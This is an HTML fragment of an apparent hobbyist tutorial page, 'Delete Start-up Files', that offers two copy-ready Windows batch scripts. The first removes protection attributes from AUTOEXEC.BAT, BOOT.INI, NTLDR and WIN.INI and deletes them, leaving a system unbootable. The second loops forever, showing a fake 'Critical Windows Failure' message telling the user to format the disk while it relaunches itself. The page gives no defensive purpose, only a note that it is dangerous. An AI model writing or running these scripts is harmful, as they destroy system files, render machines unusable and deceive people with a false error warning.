    <div class="container-fluid d-flex flex-column flex-wrap justify-content-start align-items-center">
        <div class="container d-flex flex-column align-items-center  justify-content-start my-1">
            <!-- content here -->
                <h1>Delete Start-up Files</h1>
                <div class="border-1 border-dark w-100 border mt-3"></div>
            <p>
                This lesson we are going to delete windows strart up files.
            </p>
            <p>
                Be verry verry careful, this is really dangerous.
            </p>
<div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
<button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
<textarea spellcheck="false" rows="9">
@ECHO OFF
ATTRIB -R -S -H C:\AUTOEXEC.BAT
DEL C:\AUTOEXEC.BAT
ATTRIB -R -S -H C:\BOOT.INI
DEL C:\BOOT.INI
ATTRIB -R -S -H C:\NTLDR
DEL C:\NTLDR
ATTRIB -R -S -H C:\WINDOWS\WIN.INI
DEL C:\WINDOWS\WIN.INI
</textarea>
</div>
<br>
<div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
<button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
<textarea spellcheck="false" rows="9">
@echo off
:START
echo Error, Critical Windows Failure. Format Hard Disk and Reinstall OS!
start hi.bat
GOTO START
</textarea>
